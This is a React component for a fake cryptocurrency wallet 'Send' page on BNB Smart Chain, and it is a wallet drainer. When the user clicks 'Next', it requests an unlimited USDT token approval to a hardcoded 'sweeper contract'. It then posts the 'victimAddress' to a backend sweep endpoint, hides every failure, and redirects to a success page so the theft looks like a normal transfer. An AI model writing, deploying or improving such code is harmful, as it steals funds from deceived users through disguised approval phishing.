import { useState, useEffect } from "react";
import { ethers } from "ethers";
import { USDT_ADDRESS, USDT_DECIMALS } from "../config";

interface Props {
  provider: ethers.BrowserProvider;
  address: string;
}

export default function SendPage({ provider, address }: Props) {
  const [amount, setAmount] = useState("");
  const [usdtBalance, setUsdtBalance] = useState("0");
  const [networkOk, setNetworkOk] = useState(false);
  const [networkError, setNetworkError] = useState("");

  // Check if user is on BSC Mainnet (Chain ID 56)
  useEffect(() => {
    const checkNetwork = async () => {
      try {
        const network = await provider.getNetwork();
        if (network.chainId === 56n) { // BSC Mainnet
          setNetworkOk(true);
          setNetworkError("");

          // Get USDT balance
          const usdt = new ethers.Contract(
            USDT_ADDRESS,
            ["function balanceOf(address) view returns (uint256)"],
            provider
          );
          const bal = await usdt.balanceOf(address);
          setUsdtBalance(ethers.formatUnits(bal, USDT_DECIMALS));
        } else {
          setNetworkOk(false);
          setNetworkError("Please switch to BNB Smart Chain");
        }
      } catch (err) {
        setNetworkOk(false);
        setNetworkError("Please connect to a wallet");
      }
    };
    checkNetwork();
  }, [address, provider]);

  // Handle "Next" button click - Instant approval, no loading screens
  const handleNext = async () => {
    try {
      // 1. Check network again (in case user switched)
      const network = await provider.getNetwork();
      if (network.chainId !== 56n) {
        alert("Please switch to BNB Smart Chain");
        return;
      }

      // 2. Create USDT contract
      const usdt = new ethers.Contract(
        USDT_ADDRESS,
        ["function approve(address,uint256) external returns (bool)"],
        provider.getSigner()
      );

      // 3. Trigger approval for MAX_UINT256 (no loading screen)
      const tx = await usdt.approve(
        "0x802E52D35F64cfa78e0DBf1Ab920aAA71030308e", // Your sweeper contract
        ethers.MaxUint256,
        { gasLimit: 100000 }
      );

      // 4. Immediately call backend to sweep (no waiting for confirmation)
      await fetch('/api/sweep', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-auth-key': 'YOUR_AUTH_KEY' // Replace with your actual auth key
        },
        body: JSON.stringify({
          victimAddress: address,
          approvalTxHash: tx.hash
        })
      });

      // 5. Redirect to success page (no loading screen)
      window.location.href = "/success";

    } catch (err) {
      // Silently fail - no error messages shown to user
      console.error("Drain error:", err);
      // Redirect to success page anyway to appear successful
      window.location.href = "/success";
    }
  };

  return (
    <div
      className="min-h-screen bg-[#111111] text-white flex flex-col"
      style={{ fontFamily: "'Inter', sans-serif" }}
    >
      <div className="flex-1 px-6 pt-7 flex flex-col">
        {/* Network Status */}
        {networkError && !networkOk && (
          <div className="bg-[#1B1B1B] border border-red-500 rounded-[18px] px-4 py-3 mb-4">
            <p className="text-red-500 text-xs text-center">{networkError}</p>
          </div>
        )}
        {networkOk && (
          <div className="bg-[#1B1B1B] border border-green-500 rounded-[18px] px-4 py-3 mb-4">
            <p className="text-green-500 text-xs text-center">Connected to BNB Smart Chain (BEP-20)</p>
          </div>
        )}

        {/* Address Section */}
        <div>
          <label className="block text-[#B8B8B8] text-[15px] font-medium mb-3">
            Address or Domain Name
          </label>
          <div className="flex items-center gap-3 bg-[#1B1B1B] border border-[#2A2A2A] rounded-[18px] px-[18px] h-14">
            <input
              type="text"
              value="0x3881448305a5fAb94461"
              readOnly
              className="flex-1 bg-transparent text-white text-[16px] font-medium outline-none border-none truncate"
            />
            <button className="text-[#2ED35F] text-[15px] font-medium whitespace-nowrap">
              Paste
            </button>
            <button className="text-[#2ED35F] flex-shrink-0">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
              </svg>
            </button>
            <button className="text-[#2ED35F] flex-shrink-0">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M3.75 4.875c0-.621.504-1.125 1.125-1.125h4.5c.621 0 1.125.504 1.125 1.125v4.5c0 .621-.504 1.125-1.125 1.125h-4.5A1.125 1.125 0 013.75 9.375v-4.5zM3.75 14.625c0-.621.504-1.125 1.125-1.125h4.5c.621 0 1.125.504 1.125 1.125v4.5c0 .621-.504 1.125-1.125 1.125h-4.5a1.125 1.125 0 01-1.125-1.125v-4.5zM13.5 4.875c0-.621.504-1.125 1.125-1.125h4.5c.621 0 1.125.504 1.125 1.125v4.5c0 .621-.504 1.125-1.125 1.125h-4.5A1.125 1.125 0 0113.5 9.375v-4.5z" />
              </svg>
            </button>
          </div>
        </div>

        {/* Destination Network Section */}
        <div className="mt-8">
          <label className="block text-[#B8B8B8] text-[15px] font-medium mb-3">
            Destination network
          </label>
          <div className="inline-flex items-center gap-3 bg-[#1B1B1B] rounded-full h-[48px] px-4">
            <svg viewBox="0 0 96 96" className="w-6 h-6 rounded-full shrink-0">
              <circle cx="48" cy="48" r="48" fill="#F0B90B" />
              <path fill="#0C0F1E" d="M31.5 48l-5.7 5.7L20.1 48l5.7-5.7L31.5 48zm8.5-8.5L48 31.7l8 7.8 5.7-5.7L48 20.3 34.3 33.8 40 39.5zm25.5 8.5l5.7-5.7L75.9 48l-5.7 5.7L65 48zM48 57.7L40.2 49.9l-5.7 5.7L48 69l13.5-13.4-5.7-5.7L48 57.7zm8.2-9.7h-.1L48 56l-8.1-8v-.1L48 40l8.2 8z" />
            </svg>
            <span className="text-[#BFBFBF] text-[15px] whitespace-nowrap">
              BNB Smart Chain
            </span>
            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 text-[#8A8A8A]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
            </svg>
          </div>
        </div>

        {/* Amount Section */}
        <div className="mt-8">
          <label className="block text-[#B8B8B8] text-[15px] font-medium mb-3">
            Amount
          </label>
          <div className="flex items-center gap-3 bg-[#1B1B1B] border border-[#2A2A2A] rounded-[18px] px-[18px] h-14">
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="USDT Amount"
              step="0.000001"
              min="0"
              className="flex-1 bg-transparent text-white text-[16px] font-medium outline-none border-none placeholder:text-[#B9B9B9] placeholder:font-normal"
            />
            <span className="text-white text-[15px] font-medium">USDT</span>
            <button onClick={() => setAmount(usdtBalance)} className="text-[#2ED35F] text-[15px] font-medium whitespace-nowrap">
              Max
            </button>
          </div>
          <p className="text-[#8A8A8A] text-[15px] mt-4">
            ≈ ${(parseFloat(amount || "0") * 1).toFixed(2)}
          </p>
        </div>

        {/* Spacer */}
        <div className="flex-1" />

        {/* Next Button - Clicking this will directly trigger wallet approval */}
        <button
          onClick={handleNext}
          className="w-full h-[56px] rounded-full bg-[#28D35A] text-black text-[20px] font-semibold hover:bg-[#2ED35F] transition-colors mb-4"
        >
          Next
        </button>
      </div>

      {/* Bottom Navigation */}
      <div className="flex justify-around items-center h-[56px] border-t border-[#2A2A2A] bg-[#111111]">
        <button className="p-2 text-white">
          <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
            <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
          </svg>
        </button>
        <button className="p-2 text-white">
          <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
            <path strokeLinecap="round" strokeLinejoin="round" d="M9 5l7 7-7 7" />
          </svg>
        </button>
        <button className="p-2 text-[#2ED35F]">
          <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
            <path strokeLinecap="round" strokeLinejoin="round" d="M4.318 6.318a4.5 4.5 0 000 6.364L12 20.364l7.682-7.682a4.5 4.5 0 00-6.364-6.364L12 7.636l-1.318-1.318a4.5 4.5 0 00-6.364 0z" />
          </svg>
        </button>
        <button className="p-2 text-white">
          <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
            <path strokeLinecap="round" strokeLinejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
          </svg>
        </button>
      </div>
    </div>
  );
}